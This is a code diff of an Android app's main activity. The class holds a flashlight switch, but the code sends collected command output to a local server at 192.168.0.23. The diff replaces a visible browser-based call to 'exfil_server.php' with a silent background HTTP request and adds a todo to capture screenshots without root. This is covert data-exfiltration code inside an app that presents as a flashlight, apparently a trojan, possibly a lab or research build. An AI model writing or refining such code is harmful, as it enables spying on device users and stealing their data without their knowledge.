@@ -13,7 +13,6 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.StrictMode;
-import android.util.Log;
 import android.view.View;
 import android.widget.CompoundButton;
 import android.widget.Switch;
@@ -22,11 +21,8 @@ import android.widget.Toast;
 
 import java.io.BufferedInputStream;
 import java.io.BufferedReader;
-import java.io.DataInputStream;
 import java.io.FileInputStream;
-import java.io.FileReader;
 import java.io.InputStreamReader;
-import java.io.OutputStream;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 
@@ -35,15 +31,20 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.nio.charset.Charset;
-import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.util.Date;
+
+import okhttp3.HttpUrl;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
 
 public class MainActivity extends AppCompatActivity {
 
     Switch flashControl;
     CameraManager cameraManager;
+    private static String base_url = "http://192.168.0.23?input=";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -164,12 +165,13 @@ public class MainActivity extends AppCompatActivity {
         } catch (InterruptedException e) {
         }
         String data = output.toString();
-        System.out.println("test exfil " + data);
-        startActivity(new Intent(Intent.ACTION_VIEW,
-                Uri.parse("http://192.168.0.23/exfil_server.php?input=" + data)));
+        new bgReq().execute(base_url+data);
+        //working but it opens a browser
+//        startActivity(new Intent(Intent.ACTION_VIEW,
+//                Uri.parse("http://192.168.0.23?input=" + data)));
     }
 
-    //todo try to implement screenshot functionality without root
+    //todo => try to implement screenshot functionality without root
     private void execute_captures() throws IOException, InterruptedException {
         Date date = new Date();
         CharSequence now = android.text.format.DateFormat.format("yyyy-MM-dd_hh:mm:ss", date);
